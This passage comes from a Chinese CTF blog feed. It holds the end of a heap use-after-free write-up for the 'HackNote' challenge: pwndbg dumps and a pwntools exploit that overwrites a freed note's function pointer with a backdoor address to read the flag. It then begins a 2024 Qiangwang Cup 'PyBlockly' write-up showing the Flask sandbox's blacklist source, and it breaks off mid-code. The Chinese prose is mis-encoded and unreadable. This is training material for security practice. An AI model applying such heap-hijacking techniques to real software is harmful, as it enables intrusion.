é‡Œå•¥éƒ½æ²¡æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«é‡Šæ”¾æ‰ä¸¤ä¸ªå †ï¼Œå‘ç° heap å˜äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x804b1a0</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹é‡Šæ”¾æ‰äº†ä¹‹åï¼Œè¯»å– 0x804b198 çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b01000000000</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b0100804b1a0</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å†çœ‹çœ‹è¿™ä¸ªï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">tcachebins</span><br><span class="line">0x10 [  2]: 0x804b1d0 â€”â–¸ 0x804b1a0 â—‚â€” 0</span><br><span class="line">0x20 [  1]: 0x804b1b0 â—‚â€” 0</span><br><span class="line">0x30 [  1]: 0x804b1e0 â—‚â€” 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹å®Œè›‹ï¼Œæ²¡æ³¨æ„åˆ° tcache ç»™æˆ‘ä¿å­˜äº†è¿™äº›å†…å®¹ï¼Œä¸è¿‡ä¸æ¸…æ¥šæ˜¯å¦å­˜åœ¨å½±å“ï¼Œç»§ç»­è°ƒä¸€è°ƒçœ‹çœ‹å§ï¼Œä¹‹åé‡æ–°ç”³è¯·ä¸ªå †</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">Note size :8</span><br><span class="line">Content :aaaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå†çœ‹çœ‹ heapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹0x804b198 è¿™ä¸ªåœ°å€çš„ chunk è¢«é‡æ–°æ‹¿å»ç”¨äº†ï¼Œç¬¬äºŒæ¬¡ç”³è¯·çš„é‚£ä¸ªåŸæœ¬å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆå’Œå­—ç¬¦ä¸²æŒ‡é’ˆçš„é‚£ä¸ª chunk è¢«åˆ†é…äº†ï¼Œä¹‹å‰æ‹¿å»ä½œä¸ºå­˜æ”¾å†…å®¹çš„é‚£ä¸¤ä¸ª chunk ä¸€ä¸ªéƒ½æ²¡æœ‰è¢«åˆ†é…ï¼Œä¹‹åè¯»ä¸€ä¸‹è¿™ä¸ªåœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0000000a61616161</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¿™é‡Œè¢«è¾“å…¥çš„å­—ç¬¦ç»™å äº†ï¼Œå†å»è¯»ä¸€ä¸‹è¿™ä¸ª 0x804b1c8ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b1c8</span></span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ²¡æœ‰å•¥å˜åŒ–ï¼Œä¾æ—§æ˜¯æŒ‡å‘è¾“å‡ºå‡½æ•°çš„åœ°å€ï¼Œä»¥åŠæŒ‡å‘æŸå­—ç¬¦ä¸²çš„åœ°å€ï¼Œ0x804b198 è¿™ä¸ªåœ°å€çš„ chunk ä¹‹å‰ç¼–å·ä¸º 0ï¼Œå› ä¸ºåœ°å€æ›´ä½ï¼Œæ›´å…ˆè¢«åˆ†é…ï¼Œè¿™ä¸ªåœ°å€æ›´é«˜çš„ä½œä¸ºç¼–å· 1ï¼ŒåŒæ—¶æ•´ä¸ªç¨‹åºå­˜åœ¨ backdoorï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥åªéœ€è¦é€šè¿‡ä¸¤æ¬¡é‡Šæ”¾ä¹‹åï¼Œå†ç”³è¯·ä¸€ä¸ª 0x8 ä¹‹ç±»æ¯”è¾ƒå°çš„ï¼Œä¿è¯èƒ½å¤Ÿå†™å…¥åœ°å€åŒæ—¶èƒ½å¤Ÿè®©åˆ†é…åˆ°çš„ chunk ä¸ºåŒä¸€ä¸ªå³å¯ï¼Œç„¶åç”³è¯·çš„æ—¶å€™å‘é€çš„æ•°æ®ä¸ºåé—¨å‡½æ•°çš„åœ°å€å³å¯ï¼Œä¹‹åè¾“å‡ºçš„æ—¶å€™å®ƒä¼šè‡ªåŠ¨è°ƒç”¨åé—¨ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">30</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[*] Switching to interactive mode</span></span><br><span class="line"><span class="comment">#flag&#123;asd32as1-1d8g1r1hj5g4d4-9d54h3jyur4nfke1a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2024ã€‘å¼ºç½‘æ¯</title>
      <link href="/posts/666fe8df.html"/>
      <url>/posts/666fe8df.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> webï¼š</h1><h2 id="pyblockly"><a class="markdownIt-Anchor" href="#pyblockly">#</a> PyBlocklyï¼š</h2><p>â€‹ç½‘ç«™æ˜¯ä¸€ä¸ªé€šè¿‡ block çš„å †ç§¯æœ¨çš„å½¢å¼ç¼–ç¨‹ï¼Œæœ‰ä¸¤ç§æ•°æ®ç±»å‹ä»¥åŠå››ç§å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯æ­£å¸¸è¿ç®—ï¼Œprint è¾“å‡ºï¼Œmin å’Œ max åŠŸèƒ½ï¼Œéšä¾¿å†™ä¸€äº›ä»£ç ï¼Œå‘ç°ç»“æœä¼šå›æ˜¾å‡ºæ¥ã€‚</p><p>â€‹å†æ¥çœ‹çœ‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span 